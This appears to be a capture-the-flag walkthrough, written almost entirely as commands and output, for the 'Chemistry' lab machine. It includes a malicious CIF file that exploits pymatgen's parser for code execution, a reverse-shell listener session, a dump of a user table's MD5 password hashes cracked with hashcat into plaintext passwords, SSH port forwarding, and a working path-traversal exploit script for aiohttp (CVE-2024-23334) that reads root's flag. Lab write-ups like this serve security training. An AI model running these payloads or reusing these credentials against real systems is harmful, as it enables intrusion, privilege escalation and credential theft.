## Chemistry

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```



```
[★]$ rlwrap nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.231.170] 45440
bash: cannot set terminal process group (1023): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
app@chemistry:~$ ls -la
ls -la
total 52
drwxr-xr-x 8 app  app  4096 Oct  9  2024 .
drwxr-xr-x 4 root root 4096 Jun 16  2024 ..
-rw------- 1 app  app  5852 Oct  9  2024 app.py
lrwxrwxrwx 1 root root    9 Jun 17  2024 .bash_history -> /dev/null
-rw-r--r-- 1 app  app   220 Jun 15  2024 .bash_logout
-rw-r--r-- 1 app  app  3771 Jun 15  2024 .bashrc
drwxrwxr-x 3 app  app  4096 Jun 17  2024 .cache
drwx------ 2 app  app  4096 Sep  2 09:31 instance
drwx------ 7 app  app  4096 Jun 15  2024 .local
-rw-r--r-- 1 app  app   807 Jun 15  2024 .profile
lrwxrwxrwx 1 root root    9 Jun 17  2024 .sqlite_history -> /dev/null
drwx------ 2 app  app  4096 Oct  9  2024 static
drwx------ 2 app  app  4096 Oct  9  2024 templates
drwx------ 2 app  app  4096 Sep  2 09:31 uploads
app@chemistry:~$
```
```
-rwx------ 1 app app 20480 Sep  2 09:31 database.db
app@chemistry:~/instance$ sqlite3 database.db
sqlite3 database.db
.tables
structure  user     
select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|hei|d8578edf8458ce06fbc5bb76a58c5ca4
```


```
[★]$ ls /usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/rockyou.txt.gz
[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[★]$ gunzip rockyou.txt.gz
[★]$ hashcat -m 0 hashes rockyou.txt
```
```
d8578edf8458ce06fbc5bb76a58c5ca4:qwerty                   
9ad48828b0955513f7cf0f7f6510c8f8:carlos123                
6845c17d298d95aa942127bdad2ceb9b:peterparker              
c3601ad2286a4293868ec2a4bc606ba3:victoria123              
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
```


```
app@chemistry:~$ cat /etc/passwd|grep '/bin/bash'
cat /etc/passwd|grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

```
[★]$ ssh rosa@chemistry.htb
ssh: Could not resolve hostname chemistry.htb: Name or service not known
[★]$ echo '10.129.231.170 chemistry.htb' | sudo tee -a /etc/hosts
10.129.231.170 chemistry.htb
[★]$ ssh rosa@chemistry.htb
The authenticity of host 'chemistry.htb (10.129.231.170)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

rosa@chemistry:~$ ss -ltnp
State          Recv-Q         Send-Q                 Local Address:Port                 Peer Address:Port        Process        
LISTEN         0              128                        127.0.0.1:8080                      0.0.0.0:*                          
LISTEN         0              4096                   127.0.0.53%lo:53                        0.0.0.0:*                          
LISTEN         0              128                          0.0.0.0:22                        0.0.0.0:*                          
LISTEN         0              128                          0.0.0.0:5000                      0.0.0.0:*                          
LISTEN         0              128                             [::]:22                           [::]:*       
```

#### 用SSH转发该端口，以便我们可以从本地机器访问它
```
[★]$ ssh -L 8787:127.0.0.1:8080 -N -vv rosa@10.129.231.170
```
#### 输入rosa密码之后，登陆浏览器

#### 在本地Terminal进行nmap
```
[★]$ nmap -p 8787 -sC -sV 127.0.0.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-02 05:11 CDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000034s latency).

PORT     STATE SERVICE VERSION
8787/tcp open  http    aiohttp 3.9.1 (Python 3.9)
|_http-title: Site Monitoring
|_http-server-header: Python/3.9 aiohttp/3.9.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
```

```
wget https://github.com/epi052/feroxbuster/releases/download/v2.12.0/x86_64-linux-feroxbuster.zip
unzip x86_64-linux-feroxbuster.zip
chmod +x feroxbuster
sudo mv feroxbuster /usr/local/bin/
feroxbuster --help

[★]$ ls /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[★]$ feroxbuster -u http://127.0.0.1:8787/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```


#### https://github.com/z3rObyte/CVE-2024-23334-PoC
```
[★]$ git clone https://github.com/z3robyte/CVE-2024-23334-PoC

[★]$ cd CVE-2024-23334-PoC
[★]$ ls
exploit.sh  README.md  requirements.txt  server.py  static

[★]$ vi exploit.sh
#!/bin/bash

url="http://localhost:8787"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
	if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done

[★]$ chmod +x exploit.sh
[★]$ ./exploit.sh
[+] Testing with /assets/../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../../root/root.txt
	Status code --> 200
dcd8cb65b360a30011ac3579082605b7
```

